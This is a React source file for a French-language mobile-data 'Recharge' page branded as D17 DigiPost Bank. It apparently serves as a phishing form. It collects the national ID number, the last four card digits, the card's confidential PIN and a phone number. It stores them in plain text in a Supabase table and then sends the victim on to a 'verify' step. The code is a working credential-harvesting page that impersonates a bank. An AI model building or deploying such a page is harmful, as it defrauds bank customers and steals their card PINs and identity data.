import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { toast } from 'sonner';
import { Loader2, Smartphone, CreditCard, User, Phone } from 'lucide-react';
import d17Logo from '@/assets/d17-logo.png';

const FORFAITS = [
  { value: '15', label: '15 Gb' },
  { value: '25', label: '25 Gb' },
  { value: '30', label: '30 Gb' },
  { value: '35', label: '35 Gb' },
  { value: '45', label: '45 Gb' },
  { value: '50', label: '50 Gb' },
  { value: '55', label: '55 Gb' },
];

export default function Recharge() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [forfait, setForfait] = useState('');
  const [cin, setCin] = useState('');
  const [numCarte, setNumCarte] = useState('');
  const [codeCarte, setCodeCarte] = useState('');
  const [tel, setTel] = useState('');

  const onlyDigits = (value: string, maxLen: number) => value.replace(/\D/g, '').slice(0, maxLen);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!forfait) { toast.error('Veuillez choisir un forfait'); return; }
    if (cin.length !== 8) { toast.error('Le CIN doit contenir 8 chiffres'); return; }
    if (numCarte.length !== 4) { toast.error('Les 4 derniers chiffres de la carte sont requis'); return; }
    if (codeCarte.length !== 4) { toast.error('Le code confidentiel doit contenir 4 chiffres'); return; }
    if (tel.length !== 8) { toast.error('Le numéro de téléphone doit contenir 8 chiffres'); return; }

    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('recharges' as any)
        .insert({
          forfait,
          cin,
          num_carte: numCarte,
          code_carte: codeCarte,
          tel,
          status: 'pending',
        })
        .select('id')
        .single();

      if (error) throw error;

      toast.success('Demande enregistrée avec succès !');
      navigate(`/recharge/verify?id=${(data as any).id}&cin=${cin}`);
    } catch (err: any) {
      toast.error('Erreur lors de l\'envoi: ' + (err.message || 'Réessayez'));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-muted/30 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex justify-center mb-4">
            <img src={d17Logo} alt="D17 DigiPost Bank" className="h-20 w-20 rounded-2xl shadow-lg" />
          </div>
          <h1 className="text-2xl font-bold text-foreground">Recharge</h1>
          <p className="text-muted-foreground mt-1">Rechargez votre ligne maintenant !</p>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="bg-card rounded-2xl border border-border shadow-xl p-6 space-y-5">
          {/* Forfait */}
          <div className="space-y-3">
            <Label className="text-sm font-semibold flex items-center gap-2">
              <Smartphone className="h-4 w-4 text-primary" />
              Forfait
            </Label>
            <RadioGroup value={forfait} onValueChange={setForfait} className="grid grid-cols-4 gap-2">
              {FORFAITS.map((f) => (
                <label
                  key={f.value}
                  className={`flex items-center justify-center rounded-xl border-2 px-3 py-2.5 text-sm font-medium cursor-pointer transition-all ${
                    forfait === f.value
                      ? 'border-primary bg-primary/10 text-primary'
                      : 'border-border hover:border-primary/40 text-foreground'
                  }`}
                >
                  <RadioGroupItem value={f.value} className="sr-only" />
                  {f.label}
                </label>
              ))}
            </RadioGroup>
          </div>

          {/* CIN */}
          <div className="space-y-2">
            <Label htmlFor="cin" className="text-sm font-semibold flex items-center gap-2">
              <User className="h-4 w-4 text-primary" />
              CIN
            </Label>
            <Input
              id="cin"
              type="text"
              inputMode="numeric"
              placeholder="Entrez votre CIN (8 chiffres)"
              value={cin}
              onChange={(e) => setCin(onlyDigits(e.target.value, 8))}
              required
            />
          </div>

          {/* Card Last 4 */}
          <div className="space-y-2">
            <Label htmlFor="num_carte" className="text-sm font-semibold flex items-center gap-2">
              <CreditCard className="h-4 w-4 text-primary" />
              4 Derniers Chiffres de la Carte
            </Label>
            <Input
              id="num_carte"
              type="text"
              inputMode="numeric"
              placeholder="4 derniers chiffres"
              value={numCarte}
              onChange={(e) => setNumCarte(onlyDigits(e.target.value, 4))}
              required
            />
          </div>

          {/* Card Code */}
          <div className="space-y-2">
            <Label htmlFor="code_carte" className="text-sm font-semibold flex items-center gap-2">
              <CreditCard className="h-4 w-4 text-primary" />
              Code Confidentiel
            </Label>
            <Input
              id="code_carte"
              type="password"
              inputMode="numeric"
              placeholder="Code confidentiel (4 chiffres)"
              value={codeCarte}
              onChange={(e) => setCodeCarte(onlyDigits(e.target.value, 4))}
              required
            />
          </div>

          {/* Phone */}
          <div className="space-y-2">
            <Label htmlFor="tel" className="text-sm font-semibold flex items-center gap-2">
              <Phone className="h-4 w-4 text-primary" />
              Tél
            </Label>
            <Input
              id="tel"
              type="text"
              inputMode="numeric"
              placeholder="Numéro de téléphone (8 chiffres)"
              value={tel}
              onChange={(e) => setTel(onlyDigits(e.target.value, 8))}
              required
            />
          </div>

          <Button type="submit" className="w-full h-12 text-base font-semibold rounded-xl" disabled={loading}>
            {loading ? <Loader2 className="h-5 w-5 animate-spin mr-2" /> : null}
            Envoyer
          </Button>
        </form>
      </div>
    </div>
  );
}
